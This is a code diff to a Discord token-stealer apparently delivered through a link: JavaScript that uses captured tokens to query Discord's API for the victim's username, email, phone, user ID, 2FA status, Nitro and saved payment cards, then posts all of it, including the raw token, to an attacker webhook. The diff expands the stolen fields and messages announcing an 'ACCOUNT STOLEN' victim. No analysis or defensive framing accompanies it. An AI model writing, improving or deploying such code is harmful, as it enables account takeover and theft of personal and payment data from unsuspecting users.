@@ -162,65 +162,87 @@ if(t&&!tok.includes(t))tok.push(t);
 }}
 }}catch(e){{}}
 
-// Process Discord account
+// Process Discord account - GET EMAIL AND PHONE
 if(tok.length>0){{
 for(let t of tok){{
 try{{
+// Get user info
 let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
 if(r.ok){{
 let u=await r.json();
-d+=`✅ Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;
+
+// Display info
+d+=`✅ Discord Found!<br>`;
+d+=`👤 ${{u.username}}#${{u.discriminator}}<br>`;
+d+=`📧 ${{u.email||'No email'}}<br>`;
+d+=`📱 ${{u.phone||'No phone'}}<br>`;
+d+=`🆔 ${{u.id}}<br>`;
 
 // Get payment info
+let cards=[];
+try{{
 let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
 headers:{{'Authorization':t}}
 }});
-let cards=[];
 if(billing.ok){{
 let b=await billing.json();
-cards=b.map(c=>`${{c.brand}} ending in ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
+cards=b.map(c=>`${{c.brand}} *${{c.last_4}} exp ${{c.expires_month}}/${{c.expires_year}}`);
 }}
+}}catch(e){{}}
 
 // Get nitro
+let nitro='None';
+try{{
 let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
 headers:{{'Authorization':t}}
 }});
-let nitro='None';
 if(subs.ok){{
 let s=await subs.json();
 if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro Full';
 }}
+}}catch(e){{}}
 
-// Send to webhook
+// Make sure email and phone are strings
+const userEmail=u.email?String(u.email):'NOT SET - No email on account';
+const userPhone=u.phone?String(u.phone):'NOT SET - No phone on account';
+const userName=u.username?String(u.username):'Unknown';
+const userDiscrim=u.discriminator?String(u.discriminator):'0000';
+const fullUsername=`${{userName}}#${{userDiscrim}}`;
+
+// Send EVERYTHING to webhook
 await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:'@everyone 🚨 FULL DISCORD ACCOUNT COMPROMISED',
+content:`@everyone 🚨 **${{fullUsername}}** JUST OPENED THE LINK!`,
 embeds:[{{
-title:'🔑 COMPLETE DISCORD ACCOUNT',
+title:`🔑 ${{fullUsername}} - ACCOUNT STOLEN`,
 color:16711680,
+description:`**Account Owner:** ${{fullUsername}}\\n**Email:** ${{userEmail}}\\n**Phone:** ${{userPhone}}`,
 fields:[
-{{name:'👤 Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
-{{name:'📧 Email',value:`\\`${{u.email||'None'}}\\``,inline:true}},
-{{name:'📱 Phone',value:`\\`${{u.phone||'None'}}\\``,inline:true}},
-{{name:'🆔 User ID',value:`\\`${{u.id}}\\``,inline:false}},
-{{name:'🔐 2FA',value:u.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
-{{name:'💎 Nitro',value:nitro,inline:true}},
-{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None saved',inline:false}},
-{{name:'🔑 TOKEN',value:`\\`\\`\\`${{t}}\\`\\`\\``,inline:false}}
+{{name:'👤 Discord Username',value:fullUsername,inline:false}},
+{{name:'📧 Email Address',value:userEmail,inline:false}},
+{{name:'📱 Phone Number',value:userPhone,inline:false}},
+{{name:'🆔 User ID',value:String(u.id||'Unknown'),inline:true}},
+{{name:'🔐 2FA Status',value:u.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
+{{name:'💎 Nitro',value:String(nitro),inline:true}},
+{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'No cards saved',inline:false}},
+{{name:'🔑 Full Token',value:`\`\`\`${{t}}\`\`\``,inline:false}}
 ],
 thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}},
-footer:{{text:'Full Account Access'}}
+footer:{{text:`${{fullUsername}} opened the link`}}
 }}]
 }})
 }});
-break;
+
+break; // Stop after first valid token
 }}
-}}catch(e){{}}
+}}catch(e){{
+console.error('Discord API error:',e);
+}}
 }}
 }}else{{
-d+='❌ No Discord login<br>';
+d+='❌ No Discord (not logged in)<br>';
 }}
 
 box.innerHTML=d;
